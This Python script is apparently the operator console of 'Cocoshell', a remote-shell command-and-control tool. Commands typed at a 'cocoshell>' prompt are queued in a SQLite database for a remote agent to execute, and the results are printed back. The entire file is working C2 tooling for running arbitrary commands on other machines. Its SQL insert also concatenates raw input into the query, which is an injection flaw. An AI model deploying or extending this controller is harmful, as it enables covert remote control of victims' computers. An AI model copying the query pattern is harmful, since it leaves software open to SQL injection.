#!/usr/bin/env python
import subprocess
import time
import sqlite3
import argparse

print("[+] Cocoshell API starting")
api_url = "http://localhost:5000"
api_log = open("logs/cocoshell_api.log", "w")
proc = subprocess.Popen(["python3", "core/api.py"], stdout=api_log)
print("[*] Cocoshell API started")

print("[+] Connecting to database")
time.sleep(2.0)
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()
print("[*] Connected")

waiting_for_result = False
result = None

#############################################################################

def new_command(cmd):
    if get_last_result()[3] == 1:
        cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES ('" + cmd + "', null, 0)")
        con.commit()
        print("[*] Command send to agent")
    else:
        print("[-] Still waiting for a result")
    return True # Always true as there is either a new command or we are still waiting for a result

def get_last_result():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

#############################################################################

try:
    while (True):
        command = input("cocoshell> ")
        if command == "exit":
            raise SystemExit
        if command == "":
            continue

        waiting_for_result = new_command(command)
        if (command == "exit-agent"):
            waiting_for_result = False
            print("[-] Telling the agent to stop")
            print("[-] Cleaning any leftovers up")
            cur.execute("UPDATE commands SET hasBeenRun = 1")
            con.commit()
            print("[+] Ready to accept new agents")

        while (waiting_for_result):
            if get_last_result()[3] == 1:
                waiting_for_result = False
                result = get_last_result()
                print("[*] Agent send result")
                print("")
                print(result[2])
                
except KeyboardInterrupt:
    print("")
    print("[+] Ctrl+C detected")
    pass
except SystemExit:
    print("")
    print("[+] Exiting")
    pass
finally:
    print("")
    print("[+] Cocoshell stopping")
    proc.terminate()
    con.commit()
    con.close()
    print("[+] Cocoshell stopped")
